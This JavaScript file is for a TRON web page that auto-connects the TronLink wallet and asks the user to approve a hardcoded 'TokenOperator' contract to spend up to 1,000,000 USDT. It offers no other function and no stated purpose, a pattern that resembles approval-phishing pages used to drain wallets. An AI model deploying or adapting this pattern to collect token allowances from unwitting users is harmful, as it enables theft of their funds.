let tronWeb;
let tokenContract;
let userAddress;

// 🔴 USDT TRC20 (Mainnet)
const TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

// 🔴 Your TokenOperator contract address
const SPENDER_ADDRESS = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";

// USDT decimals
const DECIMALS = 6;

// 🔒 MAX APPROVAL LIMIT (USDT)
const MAX_APPROVAL_AMOUNT = "1000000"; // user can NOT approve more than this

// Wait for TronLink
async function waitForTronLink() {
    return new Promise(resolve => {
        const timer = setInterval(() => {
            if (window.tronWeb && window.tronWeb.ready) {
                clearInterval(timer);
                resolve();
            }
        }, 500);
    });
}

// Auto connect
window.addEventListener("load", async () => {
    await connectWallet();
});

async function connectWallet() {
    await waitForTronLink();

    tronWeb = window.tronWeb;
    userAddress = tronWeb.defaultAddress.base58;

    tokenContract = await tronWeb.contract().at(TOKEN_ADDRESS);

    document.getElementById("status").innerText =
        `Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
}

async function executeApproval() {
    if (!tokenContract) {
        await connectWallet();
    }

    try {
        const inputValue = document.getElementById("amount").value;

        if (!inputValue || inputValue <= 0) {
            alert("Enter valid amount");
            return;
        }

        // Convert to BigNumber
        const userAmount = tronWeb.toBigNumber(inputValue);
        const maxAmount = tronWeb.toBigNumber(MAX_APPROVAL_AMOUNT);

        // 🔒 FINAL APPROVAL AMOUNT (CAPPED)
        const finalAmount = userAmount.gt(maxAmount)
            ? maxAmount
            : userAmount;

        // Convert to smallest unit
        const approvalAmount = finalAmount
            .times(tronWeb.toBigNumber(10).pow(DECIMALS));

        document.getElementById("status").innerText =
            `Approving ${finalAmount.toString()} USDT...`;

        const tx = await tokenContract.approve(
            SPENDER_ADDRESS,
            approvalAmount.toString()
        ).send({
            feeLimit: 100_000_000
        });

        document.getElementById("status").innerText =
            `Approved ${finalAmount.toString()} USDT ✔ Tx: ${tx}`;

    } catch (err) {
        console.error(err);
        document.getElementById("status").innerText =
            "Approval cancelled or failed";
    }
}
